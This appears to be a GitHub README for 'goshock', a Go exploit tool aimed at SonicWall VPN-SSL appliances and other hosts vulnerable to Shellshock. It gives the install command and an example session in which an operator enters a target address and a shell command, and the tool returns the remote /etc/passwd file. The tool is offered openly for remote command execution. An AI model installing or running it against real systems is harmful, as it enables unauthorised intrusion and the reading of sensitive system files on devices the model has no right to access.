# goshock
SonicWall VPN-SSL Exploit* using Golang ( * and other targets vulnerable to shellshock ).

# Install
```
▶ go get -u -v github.com/gustavorobertux/goshock
```
# Basic Usage
```
▶ goshock

TARGET> x.x.x.x
Linux Shell Command> cat /etc/passwd

root:x:0:0:root:/root:/usr/sbin/cli
bin:x:1:1:bin:/bin:/bin/false
daemon:x:2:2:daemon:/sbin:/bin/false
mail:x:8:12:mail:/var/spool/mail:/bin/false
squid:x:23:23:ftp:/var/spool/squid:/bin/false
ntp:x:38:38::/etc/ntp:/bin/false
sshd:x:74:74:sshd:/var/empty:/bin/false
nobody:x:99:99:Nobody:/home/nobody:/bin/false
snort:x:100:101:ftp:/var/log/snort:/bin/false
logwatch:x:102:102::/var/log/logwatch:/bin/false
dnsmasq:x:103:103::/:/bin/false
cron:x:104:104::/:/bin/false
admin::105:105::/:/usr/sbin/cli
```
# Screenshot
<p align="center"><img src="https://github.com/gustavorobertux/goshock/blob/main/goshock.png" width="40%"></p>
